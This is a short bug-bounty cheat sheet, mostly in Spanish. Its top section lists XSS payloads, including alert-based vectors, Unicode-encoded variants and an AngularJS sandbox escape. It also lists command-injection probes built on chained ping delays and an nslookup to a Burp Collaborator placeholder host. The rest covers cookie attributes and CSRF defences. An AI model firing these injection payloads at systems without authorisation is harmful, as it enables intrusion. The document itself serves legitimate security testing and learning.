# BugBounty_tips

#Xss
%u003Csvg onload=alert(1)> \
%u3008svg onload=alert(2)> \
%uFF1Csvg onload=alert(3)> \
=<img%20src=x%20onerror=alert('Welcome,%20v
q=<g><script>alert%28document.domain%29<%2Fscript>   
<img src=x onerror=console.log("XSS")>   
‘);</script><script>alert(1)</script>  
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}


#Command Injection
url/cgi-bin/parameter=payload
payload 1 [PING]
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
payload 2 [Nslookup]
|nslookup -q=cname http://YOUR.burpcollaborator.net.&
  
  
#cookie atributes
Las cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión
Creando
Set-Cookie: <nombre-cookie>=<valor-cookie>
---
Session
Expires
---
Securizar
Cookies Secure y HttpOnly
Previene la lectura y modificacion
Para prevenir ataques cross-site scripting (XSS (en-US)), las cookies HttpOnly son inaccesibles desde la API de Javascript Document.cookie; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag HttpOnly.
---
Alcance
Las directivas Domain y Path definen el alcance de la cookie: a qué URLs deberían enviarse las cookies.
Domain : especifica los hosts permitidos
Path   : espeficia directorios
---
Samesite
SameSite=Strict
Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie.y no hara en origenes distintos
Lax
Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames

---
Acceso desde JavaScript usando Document.cookie
También se pueden crear nuevas cookies via JavaScript usando la propiedad Document.cookie, y si el flag HttpOnly no está establecido

Tracking no legal
  
HOW WORKS HTTPONLY
https://www.youtube.com/watch?v=d8liHExs5tc
https://www.youtube.com/watch?v=ZSUGfIy1ds8
https://www.youtube.com/watch?v=brNL_bvUCck
  

SAMEORIGINPOLICY SOP

  
  
  
 
#CSRF
Los endpoints GET no deben tener acciones de modificación, y si esto se necesita se debería requerir una petición POST. Además los endpoints POST no debería aceptar la intercambiabilidad de aceptar peticiones GET con parametros en query string
Un token CSRF debería ser incluido en cada elemento <form> mediante un input oculto. Este token debe ser único para cada usuario y almacenado (por ejemplo, en una cookie). De esta forma el servidor puede mirar si el valor requerido es enviado, y en cierto modo lo idea sería descartar la petición si el valor no concuerda con lo esperado.
Este método de protección recae en la imposibilidad de que un atacante pueda predecir este token autogenerado en cada inicio de sesión. Cabe aclarar que este token debería ser regenerado en cada inicio de sesión.
Al igual que con {{Glosario ("XSS")}}, el filtrado de entrada es importante.
Debería de existir siempre un requerimiento de confirmación para cualquier acción delicada,.
Las cookies empleadas en acciones delicadas deberían de tener una vida útil breve.

  
  
  
  
  
  
  
  
  
 
  



